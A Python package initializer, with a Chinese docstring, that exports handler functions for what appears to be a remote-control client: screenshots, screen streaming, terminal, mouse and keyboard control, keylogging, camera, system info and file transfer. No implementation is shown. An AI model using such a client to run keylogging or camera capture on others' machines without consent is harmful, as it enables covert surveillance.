# -*- coding: utf-8 -*-
"""客户端功能模块处理器包，导出所有 handler 函数。"""

from .screenshot import handle_screenshot
from .screen_stream import handle_screen_stream
from .process import handle_process
from .terminal import handle_terminal
from .mouse import handle_mouse
from .keyboard import handle_keyboard
from .keylog import handle_keylog
from .system_info import handle_system_info
from .camera import handle_camera
from .disk import handle_disk
from .file_transfer import handle_file_transfer, handle_file_transfer_data
from .file_manager import handle_file_manager

__all__ = ['handle_screenshot', 'handle_screen_stream', 'handle_process', 'handle_terminal',
           'handle_mouse', 'handle_keyboard', 'handle_keylog', 'handle_system_info',
           'handle_camera', 'handle_disk',
           'handle_file_transfer', 'handle_file_transfer_data', 'handle_file_manager']
